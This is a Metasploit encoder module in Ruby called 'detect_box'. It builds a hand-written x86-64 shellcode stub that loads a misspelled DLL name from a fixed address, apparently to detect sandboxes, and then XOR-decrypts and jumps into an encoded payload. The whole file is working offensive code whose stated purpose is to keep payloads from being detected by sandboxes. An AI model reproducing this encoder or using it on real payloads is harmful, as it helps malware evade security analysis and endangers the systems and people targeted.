##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

# Possibilities of improvement:
# 	writting directly the key in the asm code (load immediate)
# 	the same for the size of the payload
# 	change the use of ror for decryption



class Metasploit3 < Msf::Encoder

  @@key = rand(2**64)

  def initialize
    super(
      'Name'             => 'detect_box',
      'Description'      => 'prevent some detection by sandbox, with loading dll',
      'Author'           => 'Paul Calderon',
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE
      )
  end
	
	# code
	# key
  	# size
  	# payload	
  def decoder_stub(state)
    stub = ""


    stub << "\x55\x48\x89\xe5\x48\x83\xec\x30" # contexte
    stub << "\x48\x31\xd2" # xor rdx, rdx
    stub << "\xeb\x22" # jmp dll
    # LibraryReturn
    stub << "\x58" # pop rax ; recuperation of the adresse of the dll name
    stub << "\x88\x50\x0d" # mov [rax+0xd], dl ; to end string with 0
    stub << "\x48\xff\xc0" #inc rax ; dll name start after 'A'
    stub << "\x48\x89\xc1" # mov rcx, rax 
    stub << "\xb8\x01\x65\xfc\x76" # mov eax,0x76fc6501 ; adresse to load DLL + 1 to avoid 0
    stub << "\x48\xff\xc8" # dec eax
    stub << "\xff\xd0"  # call eax ; load DLL
    stub << "\x48\x39\xd0" # cmp rax, rdx ; test loading
    stub << "\x75\x05" # jne Decoder
    stub << "\x48\x31\xc0"
    stub << "\xeb\x02"
    stub << "\xeb\x15" 
    stub << "\x5d\xc3" # pop rbp ; ret
    stub << "\xe8\xd9\xff\xff\xff" # call LibraryReturn ; in order to have dll string adress
    stub << "\x41\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x4e" # 'Akernell32.dllN'
    # Decoder
    stub << "\xeb\x2a" # jmp GetPayload
    # start of decoder
    stub << "\x58" # pop rax ; get payload key address
    # Automatic decryption of payload with key
    stub << "\x48\x8b\x08\x48\x8b\x50\x08\x48\x83\xc0\x10\x48\x89\x45\xf8\x48\x89\xc6\x48\x31\xc0"
    stub << "\x48\x39\xc2"
    stub << "\x75\x03"
    stub << "\xff\x65\xf8"
    stub << "\x30\x0c\x06"
    stub << "\x48\xc1\xc9\x08"
    stub << "\x48\xff\xc0"
    stub << "\xeb\xec"
    # GetPayload
    stub << "\xe8\xd1\xff\xff\xff" # call startOfDecoder ; in order to have key+payload address
    
    stub << [@@key].pack("Q") 
    stub << [state.buf.length].pack("Q")
    return stub
  end

  def encode_block(state, block)
    encoded = ""
    key_tab = [@@key].pack('Q<')
    i=0
    block.unpack('C*').each do |ch|
	    octet = key_tab[i%8]
	    t = ch.ord ^ octet.ord
	    encoded += t.chr
	    i+=1
    end
    return encoded
  end
end
